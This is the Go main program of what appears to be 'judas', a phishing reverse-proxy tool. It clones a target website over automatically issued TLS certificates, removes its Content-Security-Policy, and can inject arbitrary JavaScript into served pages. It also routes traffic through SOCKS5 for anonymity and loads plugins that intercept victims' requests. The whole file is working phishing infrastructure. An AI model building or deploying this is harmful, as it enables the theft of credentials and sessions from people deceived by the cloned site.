package main

import (
	"crypto/tls"
	"crypto/x509"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	_ "net/http/pprof"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/joncooperworks/judas"
	"golang.org/x/crypto/acme/autocert"
)

var (
	targetURL           = flag.String("target", "", "The website we want to phish.")
	address             = flag.String("address", "localhost:8080", "Address and port to run proxy service on. Format address:port.")
	attachProfiler      = flag.Bool("with-profiler", false, "Attach profiler to instance.")
	proxyURL            = flag.String("proxy", "", "Optional upstream SOCKS5 proxy. Useful for torification.")
	javascriptURL       = flag.String("inject-js", "", "URL to a JavaScript file you want injected.")
	insecure            = flag.Bool("insecure", false, "Listen without TLS.")
	sourceInsecure      = flag.Bool("insecure-target", false, "Not verify SSL certificate from target host.")
	proxyCACertFilename = flag.String("proxy-ca-cert", "", "Proxy CA cert for signed requests")
	sslHostname         = flag.String("ssl-hostname", "", "Hostname for SSL certificate")
	pluginPaths         = flag.String("plugins", "", "Colon separated file path to plugin binaries.")
)

func exitWithError(message string) {
	log.Println(message)
	os.Exit(-1)
}

func setupRequiredFlags() {
	flag.Parse()
	if *address == "" {
		exitWithError("--address is required.")
	}

	if *targetURL == "" {
		exitWithError("--target is required.")
	}

	if !*insecure && *sslHostname == "" {
		exitWithError("--ssl-hostname is required unless --insecure flag is enabled.")
	}
}

func main() {
	setupRequiredFlags()
	log.Println("Setting target to", *targetURL)
	u, err := url.Parse(*targetURL)
	if err != nil {
		exitWithError(err.Error())
	}

	responseTransformers := []judas.ResponseTransformer{
		judas.LocationRewritingResponseTransformer{},
		judas.CSPRemovingTransformer{},
	}

	if *javascriptURL != "" {
		responseTransformers = append(responseTransformers, judas.JavaScriptInjectionTransformer{JavascriptURL: *javascriptURL})
	}

	logger := log.New(os.Stdout, "judas: ", log.Ldate|log.Ltime|log.Llongfile)

	rootCAs, _ := x509.SystemCertPool()
	if rootCAs == nil {
		rootCAs = x509.NewCertPool()
	}
	if *proxyCACertFilename != "" {
		proxyCACertFile, err := os.Open(*proxyCACertFilename)
		if err != nil {
			logger.Fatal(err)
		}
		defer proxyCACertFile.Close()

		certs, err := ioutil.ReadAll(proxyCACertFile)
		if err != nil {
			logger.Fatal(err)
		}

		if ok := rootCAs.AppendCertsFromPEM(certs); !ok {
			logger.Fatalf("failed to trust custom CA certs from %s", *proxyCACertFilename)
		}
	}

	var httpTransport http.RoundTripper = &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: *insecure,
			RootCAs:            rootCAs,
		},
	}

	if *proxyURL != "" {
		proxy, err := url.Parse(*proxyURL)
		if err != nil {
			logger.Fatal(err)
		}

		httpTransport.(*http.Transport).Proxy = http.ProxyURL(proxy)
	}

	transport := &judas.InterceptingTransport{
		RoundTripper: httpTransport,
	}

	if *pluginPaths != "" {
		pluginFilePaths := strings.Split(*pluginPaths, ":")
		plugins, err := judas.LoadPlugins(logger, pluginFilePaths)
		if err != nil {
			exitWithError(err.Error())
		}

		transport.Plugins = plugins
	}

	config := &judas.Config{
		TargetURL:            u,
		ResponseTransformers: responseTransformers,
		Logger:               logger,
		Transport:            transport,
	}
	phishingProxy := judas.New(config)

	if *attachProfiler {
		go func() {
			log.Println("Starting profiler.")
			log.Println(http.ListenAndServe("localhost:6060", nil))
		}()
	}

	if err != nil {
		exitWithError(err.Error())
	}

	http.HandleFunc("/", phishingProxy.HandleRequests)

	if *insecure {
		listenAddr := fmt.Sprintf("http://%s", *address)
		log.Println("Listening on:", listenAddr)
		err = http.ListenAndServe(*address, nil)
		if err != nil {
			log.Println(err)
		}
	} else {
		certManager := autocert.Manager{
			Prompt:     autocert.AcceptTOS,
			HostPolicy: autocert.HostWhitelist(*sslHostname),
			Cache:      autocert.DirCache(cacheDir(*sslHostname)),
		}

		tlsConfig := &tls.Config{
			GetCertificate: certManager.GetCertificate,
			MinVersion:     tls.VersionTLS12,
			CipherSuites: []uint16{
				// TLSv1.3
				tls.TLS_AES_256_GCM_SHA384,
				tls.TLS_CHACHA20_POLY1305_SHA256,
				tls.TLS_AES_128_GCM_SHA256,

				// TLSv1.2
				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			},
		}

		server := &http.Server{
			ReadTimeout:  5 * time.Second,
			WriteTimeout: 10 * time.Second,
			IdleTimeout:  120 * time.Second,
			Addr:         ":https",
			TLSConfig:    tlsConfig,
		}

		go http.ListenAndServe(":http", certManager.HTTPHandler(nil))

		server.ListenAndServeTLS("", "")
	}

}

func cacheDir(hostname string) (dir string) {
	dir = filepath.Join(os.TempDir(), "cache-golang-autocert-"+hostname)
	if _, err := os.Stat(dir); !os.IsNotExist(err) {
		log.Println("Found cache dir:", dir)
		return dir
	}
	if err := os.MkdirAll(dir, 0700); err == nil {
		return dir
	}

	panic("couldnt create cert cache directory")
}
